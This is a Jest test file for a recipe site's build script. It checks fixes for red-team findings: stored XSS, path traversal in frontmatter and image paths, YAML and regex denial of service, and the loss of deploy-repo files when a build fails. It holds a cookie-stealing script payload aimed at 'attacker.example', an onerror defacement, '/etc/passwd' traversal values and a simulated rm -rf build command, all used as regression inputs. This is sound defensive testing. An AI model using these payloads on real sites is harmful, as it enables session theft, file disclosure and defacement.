/**
 * Tests for scripts/preserve-build.js security fixes.
 *
 * scripts/preserve-build.js is a plain ESM .js file (the project's
 * "type": "module" build script, run via `node scripts/preserve-build.js`,
 * never via `astro build` directly). Jest's CJS-based transform can't load
 * raw ESM `.js` files directly, so these tests exercise the real script via
 * Node subprocesses — the same way it actually runs in production — rather
 * than duplicating its logic in the test.
 *
 * Covers:
 *  - RT-2026-07-30-01: stored XSS via unsanitised recipe markdown.
 *  - RT-2026-07-30-02: a build failure permanently deleting the deploy
 *    repo's .git/CNAME/.nojekyll.
 *  - RT-2026-09-06-06: unvalidated markdown body image destinations letting
 *    a hostile Recipes-repo commit read/publish arbitrary local files off
 *    the build machine, or permanently break the build.
 */

import { execFileSync } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

const projectRoot = path.resolve(__dirname, '../..');
const scriptPath = path.join(projectRoot, 'scripts/preserve-build.js');

/** Runs a small ESM snippet that imports preserve-build.js and prints JSON. */
function runSnippet(code: string): any {
  const output = execFileSync('node', ['--input-type=module', '-e', code], {
    cwd: projectRoot,
    encoding: 'utf8',
  });
  const lastLine = output.trim().split('\n').pop() as string;
  return JSON.parse(lastLine);
}

describe('sanitizeMarkdownContent (RT-2026-07-30-01)', () => {
  test('neutralises the exact stored-XSS payload from the red-team repro', () => {
    const payload =
      "# Recipe\n\n<script>fetch('https://attacker.example/steal?d='+document.cookie)</script>" +
      "<img src=x onerror=\"document.body.innerHTML='<h1>DEFACED</h1>'\">";

    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      const payload = ${JSON.stringify(payload)};
      const sanitized = sanitizeMarkdownContent(payload);
      console.log(JSON.stringify({
        sanitized,
        containsScriptTag: sanitized.includes('<script>'),
        containsOnerror: /<img[^>]*onerror=/.test(sanitized),
      }));
    `);

    expect(result.containsScriptTag).toBe(false);
    expect(result.containsOnerror).toBe(false);
    // The payload text itself is preserved (as inert text), not deleted.
    expect(result.sanitized).toContain('DEFACED');
  });

  test('leaves ordinary recipe markdown untouched', () => {
    const normal = '# Autumn Salad\n\n## Ingredients\n- Beetroots\n- Mushrooms\n';
    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify({ sanitized: sanitizeMarkdownContent(${JSON.stringify(normal)}) }));
    `);
    expect(result.sanitized).toBe(normal);
  });
});

describe('sanitizeMarkdownContent no longer does URL-scheme filtering (moved to a rehype-style AST plugin, RT-2026-09-06-04 / RT-2026-09-06-05)', () => {
  // The markdown-source regex sanitizer (sanitizeMarkdownUrls()) was removed
  // entirely: it was bypassable (backslash-escaped colons, uppercase hex
  // character references, reference definitions nested in blockquotes/list
  // items — RT-2026-09-06-04) and itself a quadratic-time build DoS
  // (RT-2026-09-06-05). URL-scheme validation now happens in
  // scripts/sanitize-url-schemes.mjs, a Sätteri hastPlugins plugin wired up
  // in astro.config.mjs's markdown.processor — see
  // test/ts/UrlSchemeSanitizerPlugin.test.ts for its coverage.
  //
  // This block only asserts sanitizeMarkdownContent() no longer touches
  // markdown link/image syntax at all (that responsibility moved out), and
  // that the DoS input the old regex choked on is now unaffected by this
  // function.

  test('does not alter markdown link/image syntax (no source-level URL filtering left)', () => {
    const content =
      "[js](javascript:alert(1))\n\n" +
      '![img](javascript:alert(1))\n\n' +
      '[normal](https://example.com/page)\n';
    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify({ sanitized: sanitizeMarkdownContent(${JSON.stringify(content)}) }));
    `);
    // sanitizeMarkdownContent() now only escapes raw HTML tag openers; plain
    // markdown link/image syntax (safe or not) passes through byte-for-byte,
    // because the AST-level plugin is the authoritative control now.
    expect(result.sanitized).toBe(content);
  });

  test('the former quadratic-time DoS input (RT-2026-09-06-05 repro) is now fast', () => {
    const result = runSnippet(`
      import { sanitizeMarkdownContent } from ${JSON.stringify(scriptPath)};
      const content = '[a\\n'.repeat(170600); // 511,800 bytes, under the 512KB cap
      const start = Date.now();
      sanitizeMarkdownContent(content);
      console.log(JSON.stringify({ elapsedMs: Date.now() - start, bytes: Buffer.byteLength(content) }));
    `);
    expect(result.bytes).toBe(511800);
    // Previously measured at 32.8s with the removed regex; the vulnerable
    // regex no longer exists, so this should be near-instant.
    expect(result.elapsedMs).toBeLessThan(2000);
  });
});

describe('validateRecipeFrontmatter (RT-2026-07-30-02)', () => {
  const goodFrontmatter =
    "---\n" +
    "layout: ../../layout/Post/MarkdownPostLayout.astro\n" +
    "title: 'Test Recipe'\n" +
    "pubDate: '2023-10-14'\n" +
    "description: 'A test recipe'\n" +
    "author: 'Test Author'\n" +
    "tags: [\"Autumn\", \"Light course\"]\n" +
    "---\n" +
    "Body text\n";

  function validate(content: string): any {
    return runSnippet(`
      import { validateRecipeFrontmatter } from ${JSON.stringify(scriptPath)};
      console.log(JSON.stringify(validateRecipeFrontmatter(${JSON.stringify(content)}, 'test.md')));
    `);
  }

  test('accepts well-formed frontmatter', () => {
    expect(validate(goodFrontmatter).valid).toBe(true);
  });

  test('rejects the exact malformed tag from the red-team repro (path traversal)', () => {
    const bad = goodFrontmatter.replace('"Light course"', '"../../../../PWNED-TRAVERSAL"');
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/tag/i);
  });

  test('rejects a stray-quote tag (matches the committed `burgers"` bug)', () => {
    const bad = goodFrontmatter.replace('"Light course"', 'burgers"');
    const result = validate(bad);
    expect(result.valid).toBe(false);
  });

  test('rejects frontmatter missing a required field (e.g. pubDate)', () => {
    const bad = goodFrontmatter.replace(/pubDate:.*\n/, '');
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/pubDate/);
  });

  test('rejects a path-traversal layout value (RT-2026-09-06-02 (a) repro)', () => {
    const bad = goodFrontmatter.replace(
      'layout: ../../layout/Post/MarkdownPostLayout.astro',
      'layout: ../../../../../../../../etc/passwd'
    );
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/layout/i);
  });

  test('rejects any layout value outside the allow-list', () => {
    const bad = goodFrontmatter.replace(
      'layout: ../../layout/Post/MarkdownPostLayout.astro',
      'layout: ../../layout/BaseLayout.astro'
    );
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/layout/i);
  });

  test('rejects oversized content before YAML parsing (RT-2026-09-06-02 (b) repro)', () => {
    const result = runSnippet(`
      import { validateRecipeFrontmatter, MAX_RECIPE_FILE_SIZE_BYTES } from ${JSON.stringify(scriptPath)};
      const oversized = 'x'.repeat(MAX_RECIPE_FILE_SIZE_BYTES + 1);
      const start = Date.now();
      const result = validateRecipeFrontmatter(oversized, 'huge.md');
      console.log(JSON.stringify({ ...result, elapsedMs: Date.now() - start }));
    `);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/size/i);
    // Rejected on a fast length check, not after an expensive parse attempt.
    expect(result.elapsedMs).toBeLessThan(1000);
  });

  test('rejects the exact path-traversal image destination from the RT-2026-09-06-06 repro', () => {
    const bad =
      goodFrontmatter + '\n![p](../../../../../../../../home/victim/Pictures/private.png)\n';
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/image destination/i);
  });

  test('rejects an unresolvable relative image path (the DoS half of RT-2026-09-06-06)', () => {
    const bad = goodFrontmatter + '\n![x](./photo.png)\n';
    const result = validate(bad);
    expect(result.valid).toBe(false);
    expect(result.reason).toMatch(/image destination/i);
  });

  test('rejects a protocol-relative or data: image destination', () => {
    expect(validate(goodFrontmatter + '\n![x](//evil.example/x.png)\n').valid).toBe(false);
    expect(
      validate(goodFrontmatter + '\n![x](data:image/png;base64,AAAA)\n').valid
    ).toBe(false);
  });

  test('still accepts a legitimate remote http(s) image destination', () => {
    const good = goodFrontmatter + '\n![p](https://example.com/photo.png)\n';
    const result = validate(good);
    expect(result.valid).toBe(true);
  });

  test('still accepts a legitimate remote image destination with a title', () => {
    const good = goodFrontmatter + '\n![p](https://example.com/photo.png "a title")\n';
    const result = validate(good);
    expect(result.valid).toBe(true);
  });

  test('accepts recipe content with no images at all (matches all 34 real published recipes)', () => {
    expect(validate(goodFrontmatter).valid).toBe(true);
  });

  test('an !!omap YAML payload no longer shows quadratic parse time', () => {
    // Reproduces the red-team's GHSA-5p4m-2wfm-xmqj measurement at a size
    // that would previously take single-digit seconds (quadratic growth);
    // with the js-yaml override in place this should stay well under a
    // second.
    const result = runSnippet(`
      import { validateRecipeFrontmatter } from ${JSON.stringify(scriptPath)};
      let entries = '';
      for (let i = 0; i < 10000; i++) entries += \`  - k\${i}: v\\n\`;
      const content = '---\\nlayout: ../../layout/Post/MarkdownPostLayout.astro\\ntitle: t\\npubDate: 2024-01-01\\nauthor: a\\ndescription: d\\nomap: !!omap\\n' + entries + '---\\nbody\\n';
      const start = Date.now();
      validateRecipeFrontmatter(content, 'omap-bomb.md');
      console.log(JSON.stringify({ elapsedMs: Date.now() - start }));
    `);
    expect(result.elapsedMs).toBeLessThan(2000);
  });
});

describe('preserved files survive a failed build (RT-2026-07-30-02 end-to-end)', () => {
  jest.setTimeout(30000);

  let scratchDir: string;

  beforeEach(() => {
    scratchDir = fs.mkdtempSync(path.join(os.tmpdir(), 'ags-preserve-build-'));

    // Minimal astro.config.mjs sibling: preserve-build.js resolves
    // '../astro.config.mjs' relative to its own location, so it must be
    // copied alongside the script inside the scratch project.
    fs.mkdirSync(path.join(scratchDir, 'scripts'), { recursive: true });
    fs.copyFileSync(scriptPath, path.join(scratchDir, 'scripts/preserve-build.js'));
    fs.writeFileSync(
      path.join(scratchDir, 'astro.config.mjs'),
      "export default { outDir: './out' };\n"
    );

    // node_modules is required for the script's `gray-matter` / `node-fetch`
    // imports; symlink the real one instead of duplicating it.
    fs.symlinkSync(
      path.join(projectRoot, 'node_modules'),
      path.join(scratchDir, 'node_modules'),
      'dir'
    );

    // Seed a fake "deploy repo" output directory with the files that must
    // be preserved across a build.
    const outDir = path.join(scratchDir, 'out');
    fs.mkdirSync(path.join(outDir, '.git'), { recursive: true });
    fs.writeFileSync(path.join(outDir, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    fs.writeFileSync(path.join(outDir, 'CNAME'), 'benjamindegryse.be\n');
    fs.writeFileSync(path.join(outDir, '.nojekyll'), '');
  });

  afterEach(() => {
    fs.rmSync(scratchDir, { recursive: true, force: true });
  });

  test('a failing "build" that also wipes outDir (simulating astro) still leaves .git/CNAME/.nojekyll restored', () => {
    const outDir = path.join(scratchDir, 'out');

    // Simulates what a real `astro build` failure looks like: outDir gets
    // emptied of the preserved files (astro clears outDir before rendering)
    // and the command exits non-zero (a render crash). Before the fix,
    // runAstroBuild() called process.exit(1) here, which skipped
    // restorePreservedFiles() entirely and left the deploy repo's .git gone.
    const failingBuildCommand = `rm -rf out/.git out/CNAME out/.nojekyll; exit 1`;

    let threw = false;
    try {
      execFileSync('node', ['scripts/preserve-build.js'], {
        cwd: scratchDir,
        env: { ...process.env, PRESERVE_BUILD_COMMAND: failingBuildCommand },
        stdio: 'pipe',
      });
    } catch (error) {
      // A failed build is expected to make the overall process exit
      // non-zero; that alone is not the bug under test.
      threw = true;
    }

    expect(threw).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.git', 'HEAD'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, 'CNAME'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.nojekyll'))).toBe(true);
  });

  test('a successful build leaves preserved files in place and exits 0', () => {
    const outDir = path.join(scratchDir, 'out');

    execFileSync('node', ['scripts/preserve-build.js'], {
      cwd: scratchDir,
      env: { ...process.env, PRESERVE_BUILD_COMMAND: 'true' },
      stdio: 'pipe',
    });

    expect(fs.existsSync(path.join(outDir, '.git', 'HEAD'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, 'CNAME'))).toBe(true);
    expect(fs.existsSync(path.join(outDir, '.nojekyll'))).toBe(true);
  });
});
